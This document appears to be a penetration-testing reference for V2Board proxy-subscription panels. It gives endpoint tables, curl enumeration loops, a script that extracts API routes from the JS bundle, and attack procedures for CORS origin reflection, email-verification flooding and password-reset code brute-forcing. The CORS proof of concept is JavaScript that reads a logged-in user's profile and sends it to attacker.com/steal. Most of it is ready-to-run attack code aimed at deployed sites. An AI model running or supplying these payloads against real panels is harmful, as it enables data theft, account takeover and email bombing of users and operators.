# V2Board Penetration Testing Reference

## Version Fingerprint

- JS bundle version tag: `?v=X.Y.Z.<timestamp>` in `/theme/v2board/assets/umi.js`
- Theme path: `/theme/v2board/assets/` (umi.js, components.async.js, vendors.async.js)
- Frontend: UmiJS SPA with hash routing (`/#/login`)
- Backend: Laravel PHP (Eloquent ORM)
- Default config message: `"app_description": "V2Board is best!"`

## API Structure

All endpoints under `/api/v1/`. Three auth tiers:

### Guest (no auth required)
| Endpoint | Method | Notes |
|----------|--------|-------|
| `/guest/comm/config` | GET | App config, reCAPTCHA status, email settings |
| `/guest/plan/fetch` | GET | All plan details (name, price, traffic, description) |
| `/guest/plan/fetch?id=N` | GET | Single plan (id param ignored, returns all) |

### Passport (auth endpoints)
| Endpoint | Method | Notes |
|----------|--------|-------|
| `/passport/auth/login` | POST | `{email, password}` |
| `/passport/auth/register` | POST | `{email, password}` — may return "本站已关闭注册" |
| `/passport/auth/forget` | POST | `{email, email_code, password, password_confirmation}` |
| `/passport/comm/sendEmailVerify` | POST | `{email}` — sends verification code |

### User (auth required, 403 if not logged in)
| Endpoint | Method | Notes |
|----------|--------|-------|
| `/user/info` | GET | User profile |
| `/user/comm/config` | GET | User-level config |
| `/user/server/fetch` | GET | Server/node list |
| `/user/order/fetch` | GET | Order history |
| `/user/order/detail?id=N` | GET | Order detail |
| `/user/order/save` | POST | Create order |
| `/user/ticket/fetch` | GET | Support tickets |
| `/user/invite/fetch` | GET | Invite codes |
| `/user/coupon/check` | POST | Coupon validation |
| `/user/stat/getTrafficLog` | GET | Traffic logs |

### Admin (typically 404 when disabled/hidden)
| Endpoint | Notes |
|----------|-------|
| `/admin/config/fetch` | Site configuration |
| `/admin/user/fetch` | User management |
| `/admin/plan/fetch` | Plan management |
| `/admin/server/fetch` | Server management |
| `/server/manage/getNodes` | Node list (may return 500 if DB issue) |

## Endpoint Enumeration Pattern

```bash
# Tier 1: Guest endpoints (no auth)
for path in guest/comm/config guest/plan/fetch; do
  curl -sk "https://target/api/v1/$path"
done

# Tier 2: Passport endpoints
for path in passport/auth/login passport/auth/register passport/auth/forget \
            passport/comm/sendEmailVerify; do
  curl -sk -X POST -H 'Content-Type: application/json' -d '{}' \
    "https://target/api/v1/$path"
done

# Tier 3: User endpoints (check for 403 vs 404)
for path in user/info user/server/fetch user/order/fetch user/ticket/fetch \
            user/invite/fetch user/coupon/check user/telegram/getBotInfo; do
  curl -sk -o /dev/null -w '%{http_code}' "https://target/api/v1/$path"
done

# Tier 4: Admin endpoints (usually 404)
for path in admin/config/fetch admin/user/fetch admin/plan/fetch \
            server/manage/getNodes; do
  curl -sk -o /dev/null -w '%{http_code}' "https://target/api/v1/$path"
done
```

**Status code interpretation**:
- 200 = public endpoint, data returned
- 403 = endpoint exists, auth required
- 405 = endpoint exists, wrong HTTP method (try POST for GET-only or vice versa)
- 422 = endpoint exists, validation error (Laravel validation)
- 404 = endpoint does not exist or is disabled
- 500 = endpoint exists, server error (potential SQL error or misconfiguration)

## SPA JS Bundle API Extraction

```python
import urllib.request, re, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
req = urllib.request.Request('https://target/theme/v2board/assets/umi.js?v=VERSION')
data = urllib.request.urlopen(req, context=ctx).read().decode('utf-8', errors='ignore')
# Pattern: /user/action or /guest/action (no /api/v1 prefix in JS)
routes = re.findall(r'["\x27](/[a-z]+/[a-z]+/[a-zA-Z]+)["\x27]', data)
for r in sorted(set(routes)):
    print(r)
```

Note: JS bundle uses paths like `/user/info` (no `/api/v1` prefix). Prepend `/api/v1` when testing.

## Common Vulnerability Patterns

### 1. CORS Origin Reflection (all versions)

V2Board reflects arbitrary `Origin` header in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`.

```bash
curl -sk -H 'Origin: https://evil.com' -I https://target/api/v1/guest/comm/config | grep Access-Control
# Expected: Access-Control-Allow-Origin: https://evil.com
```

**Impact**: Any website can make authenticated cross-origin requests. Steal user data (plans, orders, servers, subscription links) via malicious page.

**PoC**:
```javascript
fetch("https://target/api/v1/user/info", {credentials:"include"})
  .then(r=>r.json())
  .then(d=>fetch("https://attacker.com/steal?data="+btoa(JSON.stringify(d))));
```

### 2. Email Verification No Rate Limiting

`/passport/comm/sendEmailVerify` accepts any email (including non-existent) without rate limiting.

```bash
# Test: send 5 rapid requests — all return {"data":true}
for i in $(seq 1 5); do
  curl -sk -X POST -H 'Content-Type: application/json' \
    -d "{\"email\":\"test$i@attacker.com\"}" \
    "https://target/api/v1/passport/comm/sendEmailVerify"
done
```

**Impact**: Email bombing, account enumeration (with timing side-channel).

### 3. Password Reset Brute-Force

`/passport/auth/forget` requires `{email, email_code, password, password_confirmation}`. No lockout on wrong codes.

```bash
# Test: 10 wrong codes, all accepted (no lockout)
for i in $(seq 1 10); do
  curl -sk -X POST -H 'Content-Type: application/json' \
    -d "{\"email\":\"target@email.com\",\"email_code\":\"$i\",\"password\":\"x\",\"password_confirmation\":\"x\"}" \
    "https://target/api/v1/passport/auth/forget"
done
# All return: "邮箱验证码有误" (not "too many attempts")
```

**Impact**: If verification code is 6 digits, brute-forceable in ~1-2 days at 100 req/s.

### 4. Login Error Status Code

Login failure returns HTTP 500 (should be 401). Message: "邮箱或密码错误". Indicates potential Laravel exception handling issue.

### 5. Admin Endpoint Error Disclosure

`/server/manage/getNodes` returns 500 with generic error message. Confirms admin endpoint exists.

## Registration Status

Check if registration is open:
```bash
curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com","password":"test12345678"}' \
  "https://target/api/v1/passport/auth/register"
# Open: validation error (missing fields)
# Closed: "本站已关闭注册"
# Invite-only: requires invite_code field
```

Config check: `is_invite_force` in `/guest/comm/config` response.
